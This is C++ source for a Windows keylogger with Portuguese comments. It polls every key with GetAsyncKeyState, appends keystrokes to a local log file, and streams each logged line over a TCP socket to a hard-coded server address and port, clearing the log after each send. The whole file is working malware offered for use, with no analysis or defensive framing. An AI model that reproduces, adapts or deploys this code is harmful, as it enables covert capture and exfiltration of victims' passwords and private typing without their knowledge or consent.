#include <iostream>
#include <winsock2.h>
#include <fstream>
#include <errno.h>
#include <cctype>
#include <Windows.h>
#include <string>

// Coded by: 0xgrah4m

#pragma comment(lib, "ws2_32.lib")

using namespace std;

#define IP_SERVER "127.0.0.1"
#define PORT_SERVER 4444
#define LOG_PATH "C:\\caminho\\para\\usar"

SOCKET sock;    

SOCKET connect_socket(void){
    WSADATA wsadata;
    if(WSAStartup(MAKEWORD(2, 2), &wsadata) != 0){
        return INVALID_SOCKET;
    }
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if(sock == INVALID_SOCKET){
        WSACleanup();
        return INVALID_SOCKET;
    } else{
        sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(IP_SERVER); // s_addr 32 bits / inet_addr string ideal
        server.sin_port = htons(PORT_SERVER); // htons modelo ideal da porta passado para socket
        
        // connect(socket, (sockaddr*)estrutura, tamanho em bytes da estrutura)
        if(connect(sock, (sockaddr*)&server, sizeof(server)) == SOCKET_ERROR){
            closesocket(sock);
            WSACleanup();
            return INVALID_SOCKET;
        } else{
            return sock;
        }
    }
}

void clear_file(){
    ofstream logFile(LOG_PATH, ofstream::out | ofstream::trunc);
    // abrindo em modo de escrita e com flag trunc para apagar os dados anteriores
    logFile.close();
}

void send_logs(){
    ifstream logFile(LOG_PATH);
    string line;
    if(logFile.is_open()){
        while(getline(logFile, line)){
            send(sock, line.c_str(), line.length(), 0);
            clear_file();
        }
    } else{
        const char *alert = "[*] Não foi possivel abrir o arquivo e enviar as linhas de logs\n";
        send(sock, alert, strlen(alert), 0);
    }

}
int main(){
    if(connect_socket() == INVALID_SOCKET){
        return 1;
    } else{
        const char *c_msg = "[*] Cliente conectado\n";
        send(sock, c_msg, strlen(c_msg), 0);

        while(true){
            for (short key = 0; key <= 255; key++){
                short key_state = GetAsyncKeyState(key);
                if(key_state == -32767){
                    Sleep(30);
                    FILE *file;
                    file = fopen(LOG_PATH, "a+");
                    if(file != NULL){
                        switch(key){
                            case '@':
                                fputc('@', file);
                                fclose(file);
                                break;
                            case VK_SPACE:
                                fputc(' ', file);
                                fclose(file);
                                break;
                            case VK_SHIFT:
                                fputs("\r\n[SHIFT]\r\n", file);
                                fclose(file);
                                break;
                            case VK_RETURN:
                                fputs("\r\n[ENTER]\r\n",file);
                                fclose(file);
                                break;
                            case VK_BACK:
                                fputs("\r\n[BACKSPACE]\r\n",file);
                                fclose(file);
                                break;
                            case VK_TAB:
                                fputs("\r\n[TAB]\r\n",file);
                                fclose(file);
                                break;
                            case VK_CONTROL:
                                fputs("\r\n[CTRL]\r\n",file);
                                fclose(file);
                                break;
                            case VK_DELETE:
                                fputs("\r\n[DEL]\r\n",file);
                                fclose(file);
                                break;
                            case VK_OEM_1:
                                fputs("\r\n[;:]\r\n",file);
                                fclose(file);
                                break;
                            case VK_OEM_2:
                                fputs("\r\n[/?]\r\n",file);
                                fclose(file);
                                break;
                            case VK_OEM_3:
                                fputs("\r\n[`~]\r\n",file);
                                fclose(file);
                                break;
                            case VK_OEM_4:
                                fputs("\r\n[ [{ ]\r\n",file);
                                fclose(file);
                                break;            
                            case VK_OEM_5:
                                fputs("\r\n[\\|]\r\n",file);
                                fclose(file);
                                break;
                            case VK_OEM_6:
                                fputs("\r\n[ ]} ]\r\n",file);
                                fclose(file);
                                break;            
                            case VK_OEM_7:
                                fputs("\r\n['\"]\r\n",file);
                                fclose(file);
                                break;  
                            case 187:
                                fputc('+',file);
                                fclose(file);
                                break;
                            case 188:
                                fputc(',',file);
                                fclose(file);
                                break;
                            case 189:
                                fputc('-',file);
                                fclose(file);
                                break;
                            case 190:
                                fputc('.',file);
                                fclose(file);
                                break;         
                            case VK_NUMPAD0:
                                fputc('0',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD1:
                                fputc('1',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD2:
                                fputc('2',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD3:
                                fputc('3',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD4:
                                fputc('4',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD5:
                                fputc('5',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD6:
                                fputc('6',file);
                                fclose(file);
                                break;                 
                            case VK_NUMPAD7:
                                fputc('7',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD8:
                                fputc('8',file);
                                fclose(file);
                                break;
                            case VK_NUMPAD9:
                                fputc('9',file);
                                fclose(file);
                                break;
                            case VK_CAPITAL:
                                fputs("\r\n[CAPS LOCK]\r\n",file);
                                fclose(file);
                                break;                
                            default:
                                fputc(tolower(key), file);
                                fclose(file);
                        }
                    } else{
                          const char *alert = "[*] Erro ao criar o arquivo:\n";
                          string err = strerror(errno);
                          send(sock, alert, strlen(alert), 0);
                          send(sock, err.c_str(), err.length(), 0);
                    }
                    send_logs();        
                }
            }
        }
    }

    return 0;
}
